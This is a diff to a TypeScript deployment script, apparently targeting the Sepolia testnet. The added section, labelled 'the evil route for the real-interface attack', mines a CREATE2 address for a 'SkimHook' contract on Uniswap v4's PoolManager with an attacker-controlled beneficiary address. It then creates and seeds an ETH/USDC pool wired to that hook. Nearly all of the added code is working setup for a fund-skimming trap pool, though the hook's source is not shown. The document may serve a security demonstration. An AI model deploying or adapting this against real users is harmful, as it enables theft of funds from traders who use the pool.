@@ -116,3 +116,39 @@ writeFileSync(resolve(ROOT, "deployments/sepolia.json"), JSON.stringify({
 }, null, 2) + "\n");
 console.log(JSON.stringify({ account: st.account4337, anchor: st.anchor, renderer: st.statelessRenderer }, null, 1));
 void addr; void key;
+
+// The evil route for the real-interface attack: SkimHook on the official PoolManager, with an ETH pool an attacker would seed.
+if (!readS().skimHook) {
+  const { mineSalt, CREATE2_DEPLOYER } = await import("./lib/hookminer");
+  const hook = artifact("SkimHook.sol", "SkimHook");
+  const flags = (1n << 6n) | (1n << 2n);
+  const { salt, address, initCode } = mineSalt(flags, hook.creation, [{ type: "address" }, { type: "address" }], [UNI.poolManager, addr("ATTACKER_KEY")]);
+  const w = wallet();
+  const code = await pub.getCode({ address });
+  if (!code || code === "0x") {
+    const hash = await w.sendTransaction({ to: CREATE2_DEPLOYER, data: encodePacked(["bytes32", "bytes"], [salt, initCode]), account: w.account!, chain: w.chain, gas: 8_000_000n });
+    await pub.waitForTransactionReceipt({ hash, timeout: 180_000 });
+  }
+  console.log("SkimHook", address);
+  writeS({ skimHook: address });
+}
+if (!readS().poolEthEvil) {
+  const usdc = readS().tokenA as Address;
+  const price = 3000e6 / 1e18;
+  const sqrtPriceX96 = BigInt(Math.floor(Math.sqrt(price) * 2 ** 48)) * 2n ** 48n;
+  const tick = Math.floor(Math.log(price) / Math.log(1.0001));
+  const tickLower = Math.floor((tick - 6000) / 60) * 60;
+  const tickUpper = Math.floor((tick + 6000) / 60) * 60;
+  const ZERO = "0x0000000000000000000000000000000000000000" as Address;
+  const k = { currency0: ZERO, currency1: usdc, fee: 3000, tickSpacing: 60, hooks: readS().skimHook as Address };
+  const init = await tx({ address: UNI.poolManager, abi: PM, functionName: "initialize", args: [k, sqrtPriceX96] });
+  const KEY_T = { type: "tuple", components: [{ name: "currency0", type: "address" }, { name: "currency1", type: "address" }, { name: "fee", type: "uint24" }, { name: "tickSpacing", type: "int24" }, { name: "hooks", type: "address" }] } as const;
+  const value = parseEther("0.05");
+  const mint = encodeAbiParameters([KEY_T, { type: "int24" }, { type: "int24" }, { type: "uint256" }, { type: "uint128" }, { type: "uint128" }, { type: "address" }, { type: "bytes" }], [k, tickLower, tickUpper, 4_000_000_000_000n, value, 1n << 127n, me, "0x"]);
+  const settle = encodeAbiParameters([{ type: "address" }, { type: "address" }], [ZERO, usdc]);
+  const sweep = encodeAbiParameters([{ type: "address" }, { type: "address" }], [ZERO, me]);
+  const unlock = encodeAbiParameters([{ type: "bytes" }, { type: "bytes[]" }], [encodePacked(["uint8", "uint8", "uint8"], [0x02, 0x0d, 0x14]), [mint, settle, sweep]]);
+  const liq = await tx({ address: UNI.positionManager, abi: parseAbi(["function modifyLiquidities(bytes unlockData, uint256 deadline) payable"]), functionName: "modifyLiquidities", args: [unlock, BigInt(Math.floor(Date.now() / 1000) + 3600)], value });
+  console.log("evil ETH pool", init.transactionHash, liq.transactionHash);
+  writeS({ poolEthEvil: { key: k, init: init.transactionHash, liquidity: liq.transactionHash } });
+}
